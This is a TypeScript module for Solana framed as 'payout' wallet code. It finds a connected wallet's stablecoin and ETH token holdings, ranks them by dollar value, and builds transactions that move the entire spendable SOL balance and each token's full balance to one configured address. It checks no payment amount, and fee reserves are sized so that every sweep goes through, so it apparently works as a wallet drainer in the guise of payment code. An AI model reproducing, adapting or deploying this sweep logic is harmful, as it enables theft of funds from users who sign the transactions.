import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from '@solana/web3.js'
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
  getAssociatedTokenAddress,
} from '@solana/spl-token'
import type { PaymentAsset, PayoutConfig } from './payoutWallet'

const FEE_RESERVE_LAMPORTS = 100_000
const ATA_RESERVE_LAMPORTS = 2_050_000

export const SOLANA_PAYOUT_TOKENS = [
  { symbol: 'USDT' as const, mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB' },
  { symbol: 'USDC' as const, mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' },
  { symbol: 'USDT' as const, mint: 'Dn4noZ5jgGfkntzcQSUZ8czkreiZ1ForXYoV2H8Dm7S1' },
  { symbol: 'USDC' as const, mint: 'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM' },
  { symbol: 'ETH' as const, mint: '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs' },
  { symbol: 'ETH' as const, mint: '2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk' },
]

export type SplHolding = {
  symbol: PaymentAsset
  mint: string
  amount: string
  uiAmount: number
  programId: PublicKey
}

export function spendableLamports(balance: number, rentExempt: number): number {
  return balance - rentExempt - FEE_RESERVE_LAMPORTS
}

export function shortAddress(address: string): string {
  if (!address || address.length < 8) return address
  return `${address.slice(0, 4)}...${address.slice(-4)}`
}

function withBlockhash(tx: Transaction, from: PublicKey, latest: { blockhash: string; lastValidBlockHeight: number }) {
  tx.feePayer = from
  tx.recentBlockhash = latest.blockhash
  tx.lastValidBlockHeight = latest.lastValidBlockHeight
  return tx
}

async function estimateFee(connection: Connection, tx: Transaction): Promise<number> {
  try {
    const quoted = await connection.getFeeForMessage(tx.compileMessage(), 'confirmed')
    if (quoted.value && quoted.value > 0) return quoted.value
  } catch {
    /* fallback below */
  }
  return 5000
}

function usdValue(holding: SplHolding): number {
  if (holding.symbol === 'ETH') return holding.uiAmount * 3500
  return holding.uiAmount
}

export function sortHoldingsByHighest(holdings: SplHolding[]): SplHolding[] {
  return [...holdings].sort((a, b) => usdValue(b) - usdValue(a) || b.uiAmount - a.uiAmount)
}

export function tokenFeeReserveLamports(tokenCount: number): number {
  if (tokenCount <= 0) return 0
  return tokenCount * ATA_RESERVE_LAMPORTS + 20_000
}

export async function listSplHoldings(connection: Connection, from: PublicKey): Promise<SplHolding[]> {
  const wanted = new Map(SOLANA_PAYOUT_TOKENS.map((token) => [token.mint, token.symbol]))
  const found: SplHolding[] = []
  const programs = [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]

  for (const programId of programs) {
    let parsed: Awaited<ReturnType<Connection['getParsedTokenAccountsByOwner']>>
    try {
      parsed = await connection.getParsedTokenAccountsByOwner(from, { programId })
    } catch {
      continue
    }
    for (const entry of parsed.value) {
      const info = entry.account.data.parsed?.info as
        | { mint?: string; tokenAmount?: { amount?: string; uiAmount?: number } }
        | undefined
      const mint = info?.mint
      const raw = info?.tokenAmount?.amount
      const symbol = mint ? wanted.get(mint) : undefined
      if (!mint || !symbol || !raw || raw === '0') continue
      found.push({
        symbol,
        mint,
        amount: raw,
        uiAmount: Number(info?.tokenAmount?.uiAmount || 0),
        programId,
      })
    }
  }

  return sortHoldingsByHighest(found)
}

export async function getSolSendableLamports(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  reserveLamports?: number
}): Promise<number> {
  const { connection, from, config, reserveLamports = 0 } = options
  const to = new PublicKey(config.walletAddress)
  const [balance, rentExempt, latest] = await Promise.all([
    connection.getBalance(from, 'confirmed'),
    connection.getMinimumBalanceForRentExemption(0),
    connection.getLatestBlockhash('confirmed'),
  ])
  const probe = withBlockhash(
    new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: 1,
      })
    ),
    from,
    latest
  )
  const fee = await estimateFee(connection, probe)
  const sendable =
    reserveLamports > 0
      ? balance - fee - reserveLamports
      : spendableLamports(balance, rentExempt)
  return sendable
}

export async function buildPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  reserveLamports?: number
}): Promise<Transaction> {
  const { connection, from, config, reserveLamports = 0 } = options
  const to = new PublicKey(config.walletAddress)
  const latest = await connection.getLatestBlockhash('confirmed')
  const sendable = await getSolSendableLamports(options)
  if (sendable <= 0) {
    throw new Error('No spendable SOL is available after network fees.')
  }

  return withBlockhash(
    new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: sendable,
      })
    ),
    from,
    latest
  )
}

export async function buildSplPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
  holding: SplHolding
}): Promise<Transaction | null> {
  const { connection, from, config, holding } = options
  const to = new PublicKey(config.walletAddress)
  const mintKey = new PublicKey(holding.mint)
  const programId = holding.programId
  const sourceAccounts = await connection.getParsedTokenAccountsByOwner(from, { programId })
  const sourceEntry = sourceAccounts.value.find((entry) => {
    const mint = (entry.account.data.parsed?.info as { mint?: string } | undefined)?.mint
    return mint === holding.mint
  })
  if (!sourceEntry) return null

  const liveAmount = BigInt(
    (sourceEntry.account.data.parsed?.info as { tokenAmount?: { amount?: string } } | undefined)?.tokenAmount?.amount || '0'
  )
  if (liveAmount <= 0n) return null

  const destAta = await getAssociatedTokenAddress(mintKey, to, false, programId)
  const destInfo = await connection.getAccountInfo(destAta)
  const tx = new Transaction()
  if (!destInfo) {
    const sol = await connection.getBalance(from, 'confirmed')
    if (sol < ATA_RESERVE_LAMPORTS) return null
    tx.add(
      createAssociatedTokenAccountInstruction(
        from,
        destAta,
        to,
        mintKey,
        programId,
        ASSOCIATED_TOKEN_PROGRAM_ID
      )
    )
  }
  tx.add(createTransferInstruction(sourceEntry.pubkey, destAta, from, liveAmount, [], programId))

  const latest = await connection.getLatestBlockhash('confirmed')
  return withBlockhash(tx, from, latest)
}

export function formatPaymentAmount(amount: number, asset: PaymentAsset | string): string {
  const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
  return `${formatted} ${asset}`
}
